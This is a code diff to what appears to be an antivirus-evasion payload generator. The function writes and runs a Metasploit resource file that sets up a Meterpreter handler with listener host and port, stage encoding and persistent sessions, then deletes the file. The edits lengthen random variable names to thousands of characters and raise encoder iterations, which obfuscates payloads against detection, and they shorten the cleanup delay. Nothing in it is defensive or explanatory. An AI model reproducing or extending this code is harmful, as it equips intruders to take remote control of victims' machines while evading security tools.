@@ -395,9 +395,9 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
                     core.Clear()
 
-                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
+                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 12 seconds" + core.amcolors.ENDC)
 
-                    time.sleep(30)
+                    time.sleep(12)
 
                     RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                     subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
@@ -452,7 +452,7 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
                     RC_Meterpreter += "set EnableStageEncoding true\n"
                     RC_Meterpreter += "set StageEncoder x86/xor_dynamic\n"
                     RC_Meterpreter += "set ExitOnSession false\n"
-                    RC_Meterpreter += "exploit -j -z"
+                    RC_Meterpreter += "exploit -z"
 
                     with open('AccessMe_To_Msf.rc', 'w') as f:
                         f.write(RC_Meterpreter)
@@ -461,8 +461,8 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
                     core.Clear()
 
-                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
-                    time.sleep(30)
+                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 12 seconds" + core.amcolors.ENDC)
+                    time.sleep(12)
 
                     RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                     subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
@@ -480,7 +480,7 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
                     RC_Meterpreter += "set lhost " + LHOST + "\n"
                     RC_Meterpreter += "set lport " + LPORT + "\n"
                     RC_Meterpreter += "set ExitOnSession false\n"
-                    RC_Meterpreter += "exploit -j -z"
+                    RC_Meterpreter += "exploit -z"
 
                     with open('AccessMe_To_Msf.rc', 'w') as f:
                         f.write(RC_Meterpreter)
@@ -489,9 +489,9 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
                     core.Clear()
 
-                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 30 seconds" + core.amcolors.ENDC)
+                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 12 seconds" + core.amcolors.ENDC)
 
-                    time.sleep(30)
+                    time.sleep(12)
 
                     RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                     subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
@@ -506,14 +506,14 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
 #Varname creator
 def Varname_Creator():
-    Varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(563,745)))
+    Varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(5647,10478)))
     return Varname
 
 
 
 #Random meterpreter encoder iteration
 def Random_Encoder_Iteration():
-    iteration = str(random.randint(1, 38))
+    iteration = str(random.randint(30, 60))
     return iteration
 
 
